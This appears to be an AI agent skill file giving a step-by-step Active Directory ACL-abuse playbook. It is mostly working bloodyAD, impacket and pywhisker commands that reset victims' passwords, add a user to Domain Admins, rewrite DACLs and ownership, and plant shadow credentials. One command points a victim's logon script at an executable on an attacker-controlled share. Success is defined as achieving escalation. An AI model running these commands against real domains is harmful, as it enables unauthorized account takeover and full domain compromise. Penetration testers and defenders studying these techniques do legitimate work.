---
name: acl-abuse
description: "Active Directory ACL abuse: GenericAll, WriteDacl, WriteOwner, ForceChangePassword, and other rights leading to privilege escalation. Use this skill when a principal has excessive rights over a privileged object."
---

# ACL Abuse

## Overview

AD permissions are the most common escalation path. A user with `GenericAll` over a group can add themselves to it — no exploit needed.

## Enumerate

```bash
bloodyAD -u user -p pass -d domain.local --host DC get writable
# or
python3 aclpwn.py --server DC -d domain.local -u user -p pass
```

## Common rights

| Right | Abuse |
|---|---|
| `GenericAll` | full control: reset password, add to group, write SPN |
| `GenericWrite` | write attributes: `scriptPath`, `servicePrincipalName`, `msDS-KeyCredentialLink` |
| `WriteDacl` | grant yourself `GenericAll` |
| `WriteOwner` | take ownership, then grant rights |
| `ForceChangePassword` | reset without knowing the current password |
| `AddMember` | add a user to the group |
| `AddKeyCredentialLink` | shadow credentials → authenticate as the target |

## ForceChangePassword

```bash
bloodyAD -u user -p pass -d domain.local --host DC set password TARGET 'NewP@ss123!'
```

## AddMember

```bash
bloodyAD -u user -p pass -d domain.local --host DC add groupMember 'DOMAIN ADMINS' user
```

## WriteDacl → GenericAll

```bash
impacket-dacledit -action write -rights FullControl -principal user -target 'TARGET$' domain.local/user:pass
```

## WriteOwner

```bash
impacket-owneredit -action write -new-owner user -target TARGET domain.local/user:pass
impacket-dacledit -action grant -rights FullControl -principal user -target TARGET domain.local/user:pass
```

## Shadow credentials (AddKeyCredentialLink)

```bash
pywhisker -d domain.local -u user -p pass --target TARGET --action add
# then request a TGT with the generated certificate
gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass pass domain.local/TARGET out.ccache
```

## Script-based escalation

`ScriptPath` write on a user → point to a malicious script on a share the user loads at logon.

```bash
bloodyAD -u user -p pass -d domain.local --host DC set object TARGET scriptPath -v '\\attacker\share\evil.bat'
```

## Pitfalls

- Some rights require the target to log on before they take effect.
- AD auditing may alert on ACL changes.
- `WriteDacl` on a group does not grant membership directly — it grants the ability to add it.

## Verification

The abused right must produce a working escalation (new group membership, working credentials, or a usable certificate).
